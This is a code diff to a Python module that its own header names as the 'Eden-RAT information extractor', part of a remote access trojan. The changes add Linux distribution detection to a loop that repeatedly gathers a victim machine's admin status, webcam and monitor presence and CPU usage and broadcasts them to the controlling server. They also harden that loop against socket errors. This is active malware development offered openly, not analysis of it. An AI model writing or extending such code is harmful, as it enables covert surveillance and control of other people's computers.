@@ -1,3 +1,8 @@
+'''
+Eden-RAT information extractor.
+Author: ISSAC
+'''
+
 import sys
 
 sys.path.append('../../../')
@@ -210,26 +215,43 @@ class Info:
             'admin': self.bAdmin,
             'Monitor': self.exists_monitor(),
             'Webcam': self.exists_webcam(),
-            'CPU': f'{self.get_cpu_usage()} %'
+            'CPU': f'{self.get_cpu_usage()} %',
+            'Distro': self.get_distro(),
         }
 
         return dic_info
 
     def send_info(self, clnt: object):
+        global INTERVAL_INFO
+
         while True:
-            info = self.get_info()
-            json_str = json.dumps(info)
+            try:
+                info = self.get_info()
+                json_str = json.dumps(info)
 
-            ls_send = [
-                '*', # boardcast
-                'info',
-                'start',
-                json_str,
-            ]
+                ls_send = [
+                    '*', # boardcast
+                    'info',
+                    'start',
+                    json_str,
+                ]
 
-            clnt.sendserver(ls_send)
+                clnt.sendserver(ls_send)
 
-            time.sleep(self.nSendInfoInterval)
+                #time.sleep(self.nSendInfoInterval)
+            except OSError as ex:
+                if ex.errno == 9:
+                    clnt.sock.close()
+                    return # terminate this loop.
+            
+            time.sleep(INTERVAL_INFO)
+
+    def get_distro(self):
+        try:
+            info = platform.freedesktop_os_release()
+            return info["ID"]
+        except Exception:
+            return "unknown"
 
     def get_details(self) -> list:
         ls = [
@@ -309,6 +331,7 @@ class Info:
     def run(self, clnt: object, szToken: str, aMsg: list) -> list:
         global g_Info
         global g_thread
+        global INTERVAL_INFO
 
         try:
             if aMsg[0] == 'start':
